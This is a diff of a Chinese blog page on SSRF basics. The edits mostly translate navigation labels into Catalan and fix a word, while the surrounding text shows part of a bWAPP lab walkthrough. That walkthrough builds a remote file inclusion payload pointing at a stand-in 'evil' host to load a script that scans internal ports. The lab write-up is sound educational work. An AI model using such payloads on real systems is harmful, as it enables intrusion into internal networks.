@@ -27,7 +27,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/02/21/SSRF漏洞基础（一）/11.png">
 <meta property="og:image" content="http://yoursite.com/2019/02/21/SSRF漏洞基础（一）/12.png">
 <meta property="og:image" content="http://yoursite.com/2019/02/21/SSRF漏洞基础（一）/13.png">
-<meta property="og:updated_time" content="2019-02-22T08:19:48.370Z">
+<meta property="og:updated_time" content="2019-02-22T08:54:36.977Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SSRF漏洞基础（一）">
 <meta name="twitter:description" content="0x01、漏洞描述SSRF是一种常见的Web漏洞，通常存在于需要请求外部内容的逻辑，当攻击者传入一个未经验证的URL，后端代码直接请求该URL，会造成SSRF漏洞。是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF的攻击目标是外网无法访问的内部系统，一大利用是探测内网端口开放信息，对于内网不是Web服务的，一般是返回端口对应服务的banner信息。Weblogic SSRF">
@@ -73,13 +73,13 @@
     <span id="nav">
       <ul>
          
-          <li><a href="/">Home</a></li>
+          <li><a href="/">Inici</a></li>
          
           <li><a href="/archives/">archives</a></li>
          
-          <li><a href="/projects_url">Projects</a></li>
+          <li><a href="/projects_url">Projectes</a></li>
          
-          <li><a href="/about/">About</a></li>
+          <li><a href="/about/">Qui som</a></li>
         
       </ul>
     </span>
@@ -93,10 +93,10 @@
         <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
     </span>
     <br>
     <div id="share" style="display: none">
@@ -188,7 +188,7 @@
 <p><img src="/2019/02/21/SSRF漏洞基础（一）/10.png" alt=""><br>图10 漏洞网址<br>观察图10中的Get请求，发现一个参数language=lang_en.php<br>Get的请求：<br>http:/<span></span>/127.0.0.1/bWAPP_latest/bWAPP/rlfi.php?language=lang_en.php&amp;action=go<br>利用language参数构造payload，远程文件包含并执行扫描脚本探测内网开放端口及服务<br>先看一下扫描脚本部分代码段</p>
 <p><img src="/2019/02/21/SSRF漏洞基础（一）/11.png" alt=""><br>图11 端口扫描代码段<br>首先弹窗了一段字符串，测试一下文件包含后是否有执行，然后设置了一个参数ip，该参数即是构造Payload时，在POST DATA中的值，即外网主机不能探测到的内网IP地址<br>构造Payload如下所示：<br>POST：<br>http://<span></span>127.0.0.1/bWAPP/rlfi.php?language=http:<span></span>//xxx.xxx.xxx/evil/ssrf-1.txt&amp;action=go<br>POST DATA：ip=127.0.0.1<br>由于该环境均搭载在本地上，所以IP地址均为127.0.0.1，实际操作中，每个IP地址代表的含义均不同。<br>第一个http<span></span>://127.0.0.1为正常的可以访问到的网址，language是参数，参数后边构造的http:<span></span>//xxx.xxx.xxx为扫描代码存放的地址，实际操作中，可以自己搭服务器，将扫描代码放置在自己的服务器上进行操作。POST DATA中的ip就是内网的ip地址，也就是扫描代码扫描的IP<br>构造Payload后执行，执行结果如下图12，13所示：</p>
 <p><img src="/2019/02/21/SSRF漏洞基础（一）/12.png" alt=""><br>图12 弹窗<br>首先进行了一个弹窗，文件包含漏洞确实包含了该文件并执行。<br>扫描的端口开放情况如下图所示：</p>
-<p><img src="/2019/02/21/SSRF漏洞基础（一）/13.png" alt=""><br>图13 探测内网端口开放情况<br>0x05 总结<br>Weblogic的SSRF漏洞实际利用也大同小异，最常见的都是先进行内网端口方面的探测，再根据实际端口开放情况进行后续利用。<br>SSRF本身并不会直接造成重大影响，但绕过了防火墙进入内网结合其他攻击方式，则可以对内网安全产生严重的威胁。<br>此份报告仅对SSRF做了基础描述整理以及漏洞复现，SSRF漏洞实际操作中的利用也花样百出，可网上进行搜集多探索。</p>
+<p><img src="/2019/02/21/SSRF漏洞基础（一）/13.png" alt=""><br>图13 探测内网端口开放情况<br>0x05 总结<br>Weblogic的SSRF漏洞实际利用也大同小异，最常见的都是先进行内网端口方面的探测，再根据实际端口开放情况进行后续利用。<br>SSRF本身并不会直接造成重大影响，但绕过了防火墙进入内网结合其他攻击方式，则可以对内网安全产生严重的威胁。<br>此份报告仅对SSRF做了基础描述整理以及漏洞复现，SSRF漏洞实际操作中的利用也花样百出，可网上进行搜集多番探索。</p>
 <p>——2019.2.20</p>
 
   </div>
@@ -203,13 +203,13 @@
     <div id="nav-footer" style="display: none">
       <ul>
          
-          <li><a href="/">Home</a></li>
+          <li><a href="/">Inici</a></li>
          
           <li><a href="/archives/">archives</a></li>
          
-          <li><a href="/projects_url">Projects</a></li>
+          <li><a href="/projects_url">Projectes</a></li>
          
-          <li><a href="/about/">About</a></li>
+          <li><a href="/about/">Qui som</a></li>
         
       </ul>
     </div>
@@ -235,10 +235,10 @@
     </div>
 
     <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
     </div>
 
   </div>
@@ -253,13 +253,13 @@
     <nav>
       <ul>
          
-          <li><a href="/">Home</a></li>
+          <li><a href="/">Inici</a></li>
          
           <li><a href="/archives/">archives</a></li>
          
-          <li><a href="/projects_url">Projects</a></li>
+          <li><a href="/projects_url">Projectes</a></li>
          
-          <li><a href="/about/">About</a></li>
+          <li><a href="/about/">Qui som</a></li>
         
       </ul>
     </nav>
